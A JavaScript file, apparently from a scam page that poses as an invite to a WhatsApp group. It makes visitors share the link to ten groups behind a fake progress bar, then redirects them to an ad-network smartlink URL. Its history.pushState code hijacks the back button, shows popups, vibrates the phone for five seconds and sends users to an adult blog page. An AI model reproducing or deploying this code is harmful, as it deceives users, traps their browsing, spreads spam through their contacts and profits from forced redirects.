// join group
function Join() {
    container.style.display = 'block';
    alert("Share to 10 active Your Whatsapp groups & wait to join this group!");
    start.style.display = 'none';
}

// share group
var clicks = 0;

function Share() {
    clicks += 1;
    if (clicks == 1) {
        document.getElementById('bar').style.width = '10%';
        document.getElementById("bar").innerHTML = "10%";
    }
    if (clicks == 2) {
        document.getElementById('bar').style.width = '20%';
        document.getElementById("bar").innerHTML = "20%";
    }
    if (clicks == 3) {
        document.getElementById('bar').style.width = '30%';
        document.getElementById("bar").innerHTML = "30%";
    }
    if (clicks == 4) {
        document.getElementById('bar').style.width = '40%';
        document.getElementById("bar").innerHTML = "40%";
    }
    if (clicks == 5) {
        document.getElementById('bar').style.width = '50%';
        document.getElementById("bar").innerHTML = "50%";
    }
    if (clicks == 6) {
        document.getElementById('bar').style.width = '60%';
        document.getElementById("bar").innerHTML = "60%";
    }
    if (clicks == 7) {
        document.getElementById('bar').style.width = '70%';
        document.getElementById("bar").innerHTML = "70%";
    }
    if (clicks == 8) {
        document.getElementById('bar').style.width = '80%';
        document.getElementById("bar").innerHTML = "80%";
    }
    if (clicks == 9) {
        document.getElementById('bar').style.width = '90%';
        document.getElementById("bar").innerHTML = "90%";
    }
    if (clicks == 10) {
        setTimeout("window.location.href = 'https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=whatsapp';", 0);
    }
};

// link
function Link() {
    location.href = 'https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=whatsapp';
}

// alert notification
var ii = 0;
var iy = 0;
if (typeof history['pushState'] === 'function') {
    history['pushState']('back', null, null);
    window['onpopstate'] = function() {
        history['pushState']('back', null, null);
        if (iy == 1) {
            iy = 0;
            document['getElementById']('popup1')['style']['display'] = 'none';
            setTimeout(function() {
                if (document['getElementById']('popup')['style']['display'] == 'none') {
                    document['getElementById']('popup')['style']['display'] = 'block'
                }
            }, 300);
            window['navigator']['vibrate'](5000)
        } else {
            if (ii == 1) {
                iy = iy + 1
            }
        }
    }
};
setTimeout(function() {
    ii = 1
}, 200);

// hidepop
function hidepop() {
    document['getElementById']('popup')['style']['display'] = 'none';
    window['location'] = 'https://jandamudaseksi.blogspot.com/p/janda-muda-seksi.html'
}

// back
    if (typeof history.pushState === "function") {
        history.pushState("back", null, null);
        window.onpopstate = function() {
            history.pushState('back', null, null);
                location.href = 'https://cqwajn.com/gosl/InNpZCI6MTA3NDQ4Nywic21hcnRsaW5rIjp0cnVlfQ==eyJwaWQiOjEwMjg3Nzcs?si1=github&si2=whatsapp';
        };
    }
